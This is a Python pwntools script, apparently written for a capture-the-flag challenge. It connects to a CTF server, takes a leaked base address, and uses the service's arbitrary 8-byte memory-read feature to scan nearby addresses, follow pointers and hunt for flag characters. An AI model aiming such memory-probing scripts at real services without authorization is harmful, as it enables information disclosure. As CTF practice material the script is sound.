from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
base = int(m.group(1), 16)
print(f'Dict base: {hex(base)}')

def read8(addr):
    io.sendline(hex(addr).encode())
    line = io.recvline(timeout=3).decode().strip()
    if 'illegal memory address' in line:
        return None
    try:
        _, data = line.split(': ')
        return bytes.fromhex(data.strip())
    except:
        return None

print("\n=== Trying different address ranges ===")

# Maybe the address is a reference/pointer TO the dict, not the dict itself
# Try reading addresses around the base
test_ranges = [
    (base - 0x100, base - 0x80),  # Before the base
    (base - 0x80, base),          # Just before base
    (base, base + 0x80),          # At and after base  
    (base + 0x80, base + 0x200),  # Further after base
]

for start, end in test_ranges:
    print(f"\nTesting range {start:#x} to {end:#x}")
    for addr in range(start, end, 8):
        data = read8(addr)
        if data:
            val = u64(data)
            print(f'{addr:#x}: {data.hex()} -> {val:#x}')
            
            # If we find a readable pointer, try following it
            if 0x400000 < val < 0x800000000000:
                ptr_data = read8(val)
                if ptr_data:
                    chars = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in ptr_data)
                    print(f'  -> {val:#x}: "{chars}"')
                    
                    # Look for flag patterns
                    clean_chars = ''.join(chr(b) for b in ptr_data if 32 <= b <= 126)
                    if 'K' in clean_chars or '{' in clean_chars or '}' in clean_chars:
                        print(f'    *** POTENTIAL FLAG PART: "{clean_chars}"')
        
        # Stop after we've used about 40 reads to be safe
        if addr - test_ranges[0][0] > 320:  # 40 * 8 bytes
            print("Hit read limit, stopping scan")
            break
    else:
        continue
    break

io.close()